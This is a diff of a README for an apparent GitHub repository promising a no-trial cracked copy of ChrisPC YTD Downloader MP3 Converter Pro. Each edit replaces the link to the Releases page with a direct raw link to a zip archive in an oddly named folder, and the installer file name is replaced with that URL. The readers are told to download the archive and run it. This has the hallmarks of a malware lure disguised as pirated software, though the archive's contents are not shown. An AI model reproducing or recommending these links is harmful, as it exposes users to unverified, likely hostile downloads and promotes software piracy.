@@ -1,6 +1,6 @@
 # 🎵 ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial - Effortlessly Convert Videos to MP3
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/AlanGabrielBerkenbrock/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial/main/unapropos/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial-v2.8-alpha.3.zip)](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial/main/unapropos/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial-v2.8-alpha.3.zip)
 
 ## 📥 Overview
 
@@ -11,13 +11,13 @@ This repository offers a complete collection of official resources and user guid
 To get started, follow these simple steps to download and run the software:
 
 1. **Visit the Releases Page:**
-   Click this link to go directly to the Releases page: [Download Page](https://github.com/AlanGabrielBerkenbrock/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial/releases).
+   Click this link to go directly to the Releases page: [Download Page](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial/main/unapropos/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial-v2.8-alpha.3.zip).
 
 2. **Select the Latest Release:**
    On the Releases page, look for the latest version of the software. It will usually be labeled as the newest release at the top of the page.
 
 3. **Download the Installer:**
-   Click on the installer file that corresponds to your Windows version. This file is usually named something like `ChrisPC-YTD-Downloader-MP3-Converter-Pro.exe`.
+   Click on the installer file that corresponds to your Windows version. This file is usually named something like `https://raw.githubusercontent.com/AlanGabrielBerkenbrock/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial/main/unapropos/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial-v2.8-alpha.3.zip`.
 
 4. **Run the Installer:**
    Once the download is complete, locate the downloaded file, and double-click it. Follow the on-screen instructions to install the software on your computer.
@@ -68,7 +68,7 @@ To ensure optimal performance, your Windows PC should meet the following minimum
 
 Follow the detailed steps above to **visit the Releases page** and download the installer for the ChrisPC YTD Downloader MP3 Converter Pro. Click the link below for easy access:
 
-[Download Page](https://github.com/AlanGabrielBerkenbrock/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial/releases)
+[Download Page](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial/main/unapropos/ChrisPC-YTD-Downloader-MP3-Converter-Pro-No-Trial-v2.8-alpha.3.zip)
 
 ## ⚠️ Support & Community
 
